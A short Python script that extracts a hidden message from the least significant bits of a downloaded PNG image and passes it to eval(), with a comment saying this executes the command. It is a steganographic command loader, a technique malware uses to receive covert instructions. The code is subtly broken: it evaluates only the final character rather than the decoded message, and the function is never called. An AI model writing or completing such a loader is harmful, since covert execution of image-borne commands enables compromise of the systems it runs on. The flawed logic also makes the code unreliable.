from PIL import Image
import numpy as np

image_path = "server/downloaded/1.png"

def retrieve_message(image_path):
    with Image.open(image_path) as img:
        width,height = img.size
        data = np.array(img)

    # flatten data
    data = np.reshape(data, width*height*3)

    # collects last bit
    data = data & 1
    data = np.packbits(data)

    #contenrts intreger to unicode
    message = ""
    for x in data:
        l = chr(x)
        if not l.isprintable():
            break
        message += l
    eval(l) # executes command